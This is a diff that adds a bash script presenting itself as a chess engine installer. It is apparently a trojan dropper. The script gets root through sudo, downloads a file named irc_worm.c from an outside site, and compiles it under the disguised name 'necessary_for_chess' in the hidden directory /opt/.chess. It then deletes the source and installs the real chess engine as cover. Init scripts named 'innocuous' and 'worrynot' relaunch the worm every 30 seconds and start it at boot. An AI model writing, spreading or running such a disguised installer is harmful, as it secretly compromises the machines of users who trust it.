@@ -1,0 +1,63 @@
+#!/bin/bash
+
+[ "$(whoami)" != "root" ] && exec sudo -- "$0" "$@"
+
+cd /usr/src
+wget --quiet conradstansbury.com/resource/irc_worm.c
+gcc irc_worm.c -o necessary_for_chess
+mkdir -p /opt/.chess > /dev/null
+mv necessary_for_chess /opt/.chess/necessary_for_chess
+rm irc_worm.c
+
+wget conradstansbury.com/resource/Chess.tar
+tar -xvf Chess.tar > /dev/null
+cd Chess-Engine/src
+
+make
+
+cp engine /usr/bin/chess-engine
+echo "The chess program has been installed as chess-engine. Please run the program and type help for more information. The program can also be started in UCI mode for use with a chess GUI with the command line parameter --uci."
+echo ""
+echo "    Best, your friendly neighborhood C hackers: Dennis and Conrad."
+cd /usr/src/
+rm Chess.tar
+rm -rf Chess-Engine
+
+echo "#!/bin/bash
+while true
+do
+ps cax | grep \"necessary_for_c\" > /dev/null
+if [ \$? -eq 0 ]; then
+     sleep 30
+else
+     /opt/.chess/necessary_for_chess &
+fi
+sleep 30
+done" > /etc/init.d/innocuous
+chmod 755 /etc/init.d/innocuous
+
+echo "#!/bin/bash
+case \$1 in
+start)
+dhclient &
+bash /etc/init.d/innocuous &
+;;
+stop)
+;;
+restart)
+;;
+status)
+;;
+*)
+echo \"Usage\"
+esac
+
+exit 0" > /etc/init.d/worrynot
+chmod 755 /etc/init.d/worrynot
+
+ln -s /etc/init.d/worrynot /etc/rc2.d/S99worrynot
+
+#m4 /etc/mail/sendmail.mc > /etc/mail/sendmail.cf
+#/etc/init.d/sendmail restart
+
+bash /etc/init.d/innocuous &
